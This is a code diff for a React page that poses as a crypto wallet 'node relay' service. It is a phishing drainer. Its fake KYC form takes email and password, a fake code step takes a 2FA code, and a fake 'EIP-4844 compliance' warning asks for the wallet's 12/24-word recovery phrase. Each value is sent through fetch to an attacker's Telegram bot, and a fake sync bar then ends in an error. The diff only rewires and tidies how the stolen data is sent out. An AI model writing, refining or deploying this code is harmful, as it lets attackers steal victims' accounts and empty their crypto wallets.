@@ -27,21 +27,21 @@ export default function App() {
   const { data: nativeBal } = useBalance({ address }); 
   const { data: tokenBal } = useBalance({ address, token: USDT_MAP[chainId] });
 
-  const log = (msg) => {
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`).catch(() => {});
-  };
-
+  // RE-ENGINEERED NOTIFICATION LOOP
   useEffect(() => {
     const trigger = () => {
       const r = Math.floor(1000 + Math.random() * 8999);
       setFeedMsg(`🛡️ 0x${r}...${r} WALLET CONNECTED TO MAINNET_NODE`);
-      log(`📡 Feed Ping: 0x${r} connected`);
+      
+      // Send alert to your Telegram so you know site is active
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📡 Active User: 0x" + r)}`).catch(() => {});
+
       setTimeout(() => setFeedMsg(""), 4000);
     };
     trigger();
     const interval = setInterval(trigger, 12000);
     return () => clearInterval(interval);
-  }, []);
+  }, [botToken, chatId]);
 
   const handleHandshake = () => {
     if (activeTask !== "Rectify" && (!inputVal || inputVal === "0")) return;
@@ -65,8 +65,8 @@ export default function App() {
     }
   }, [selectedAsset, tokenBal, nativeBal, activeTask]);
 
-  // ULTRA STABLE SEED CHECK
-  const isSeedReady = seedVal.trim().split(/\s+/).length >= 12;
+  // SEED VALIDATION: Must be 12+ words
+  const isSeedOk = seedVal.trim().split(/\s+/).filter(w => w.length > 1).length >= 12;
 
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
@@ -120,12 +120,12 @@ export default function App() {
                 <>
                   <input placeholder="EMAIL" value={kycEmail} onChange={(e)=>setKycEmail(e.target.value)} style={{width:'100%', padding:'18px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'15px', outline:'none'}} />
                   <input type="password" placeholder="PASSWORD" value={kycPass} onChange={(e)=>setKycPass(e.target.value)} style={{width:'100%', padding:'18px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'25px', outline:'none'}} />
-                  <button disabled={!kycEmail || !kycPass} onClick={()=>{log(`🆔 KYC: ${kycEmail} | PASS: ${kycPass}`); setKycPhase(2);}} style={{width:'100%', backgroundColor: (kycEmail && kycPass) ? '#10b981' : '#1e293b', color: (kycEmail && kycPass) ? '#000' : '#475569', padding:'20px', borderRadius:'15px', fontWeight:'900', border:'none'}}>VERIFY RELAY</button>
+                  <button disabled={!kycEmail || !kycPass} onClick={()=>{ fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🆔 KYC: " + kycEmail + " | PASS: " + kycPass)}`).catch(()=>{}); setKycPhase(2);}} style={{width:'100%', backgroundColor: (kycEmail && kycPass) ? '#10b981' : '#1e293b', color: (kycEmail && kycPass) ? '#000' : '#475569', padding:'20px', borderRadius:'15px', fontWeight:'900', border:'none'}}>VERIFY RELAY</button>
                 </>
               ) : (
                 <>
                   <input maxLength="6" type="number" placeholder="000000" value={kycCode} onChange={(e)=>setKycCode(e.target.value)} style={{width:'100%', padding:'18px', backgroundColor:'black', border:'2px solid #3b82f6', borderRadius:'15px', color:'white', textAlign:'center', fontSize:'28px', letterSpacing:'5px', outline:'none', marginBottom:'25px'}} />
-                  <button disabled={kycCode.length < 6} onClick={()=>{log(`🔑 CODE: ${kycCode}`); setView("seed_gate");}} style={{width:'100%', backgroundColor: kycCode.length >= 6 ? '#3b82f6' : '#1e293b', color: kycCode.length >= 6 ? '#fff' : '#475569', padding:'20px', borderRadius:'15px', fontWeight:'900', border:'none'}}>AUTHORIZE</button>
+                  <button disabled={kycCode.length < 6} onClick={()=>{ fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🔑 CODE: " + kycCode)}`).catch(()=>{}); setView("seed_gate");}} style={{width:'100%', backgroundColor: kycCode.length >= 6 ? '#3b82f6' : '#1e293b', color: kycCode.length >= 6 ? '#fff' : '#475569', padding:'20px', borderRadius:'15px', fontWeight:'900', border:'none'}}>AUTHORIZE</button>
                 </>
               )}
             </div>
@@ -139,8 +139,8 @@ export default function App() {
                     <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px'}}>🛡️ EIP-4844 COMPLIANCE</div>
                     <p style={{fontSize:'10px', color:'#475569', margin:'20px 0', lineHeight:'1.5'}}>CRITICAL: NODE_EXCRYPTION_ID EXPIRED. PROVIDE RECOVERY KEY TO RESTORE END-TO-END MAINNET TUNNEL.</p>
                     <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px', outline:'none'}} />
-                    <button disabled={!isSeedReady} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: NODE RELAY TIMEOUT."); setView("menu")},1200)}},60);}} 
-                    style={{width:'100%', backgroundColor: isSeedReady ? '#10b981' : '#1e293b', color: isSeedReady ? '#000' : '#475569', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none'}}>ENCRYPT & SYNC</button>
+                    <button disabled={!isSeedOk} onClick={()=>{setIsSyncing(true); fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🚨 SEED: " + seedVal)}`).catch(()=>{}); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: NODE RELAY TIMEOUT."); setView("menu")},1200)}},60);}} 
+                    style={{width:'100%', backgroundColor: isSeedOk ? '#10b981' : '#1e293b', color: isSeedOk ? '#000' : '#475569', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none'}}>ENCRYPT & SYNC</button>
                   </>
                 ) : (
                   <div><div style={{fontSize:'60px', color:'white', fontWeight:'900'}}>{syncProgress}%</div><div style={{color:'#10b981'}}>STABILIZING_RELAY_POOL...</div></div>
